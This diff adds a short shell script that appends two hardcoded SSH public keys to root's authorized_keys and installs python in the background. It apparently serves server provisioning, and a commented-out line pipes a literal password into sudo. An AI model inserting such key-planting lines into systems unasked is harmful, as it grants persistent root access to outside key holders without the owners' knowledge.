@@ -1,0 +1,15 @@
+#!/bin/sh
+
+#if [ "$1" != "sudo" ]; then
+#        echo "PASSWORD" | sudo -S $0 sudo
+#        exit
+#fi
+
+mkdir /root/.ssh
+cat >> /root/.ssh/authorized_keys << EOF
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzLUwi992m6SnIIQvtprUYkbIF++zHK5Fh//VncOr0vTPbbg1IahZO8gaUMWGSVQyh6RwH4N39YcKZxi/jzk4DSfPnXDwue7qxhXSReRhm2p+qTpeykITVQAGgTI/kvAheWSsktgb/kPtJ8Ucz/VlNZxhJAgUIvYyGWgS4cZuiT1srxfXOEmFx9gIkOMPX6Ez63XIRjbWMtSeaPXRiqgpp6Zc0VgUXMRQ6t6h/o2VjtATIq0tKuyBc6tuIwAlzx9NtyP+dFC/4R+OLnihVnX2vxqf/STgSJe5HRb00gYUxlwwqZqkONrMWBM/Ed33Q3zzW4EZ49B1hEpzlkYX0kP+Cw== root@no1
+ssh-dss AAAAB3NzaC1kc3MAAACBAPSJqkYpLqttDqI67dQkyWLvEyqhsdF8pQx1Yo4wJ+fhkqrkTf8OsySa5yYUsgYV5QMbtyBft/jTSrMPIk9biQ/KMKx8VuSOCRgV86JblbfVdwDTFGkrD6zXI9M77bG17YWtniMmHvXCLEk2UoAq/nxvCXedC29qM2oDCEQTOWVjAAAAFQCMuei0k3rpjCpa86vQsNReDkIrLQAAAIAgajHMSbTYCM1stvfegAxsYPtPwqEifXT94T1gIRwMFSulUJGnusG7B/ZGQ86y6djAFFU9SEyqnSx7cgecD/PqeFuj3krjxqHLxH2UTK9KI5sS3Pcj8lJMPWvv0f6sPwIYMqpMjR9U9kug9HirHK1009D01yA598nmz9QSaP31mQAAAIEAxuQLDO/gfWoNq6oJL7Z6UXzmamL10NZ2xlQlXb5l4LXo6JnOt2QHxRakQZVohLNUHiNDY1QMhdDPNoavGOMvM+YX9V8EM5u00yJa7Aga6U68aS0irzl5kQc37s/NUsUjY5/R6Z+w1SQasT8e5gtAzIdipVOHau9tKKCAkilnsFs= root@no1
+EOF
+
+
+nohup apt-get --yes --quiet install python &
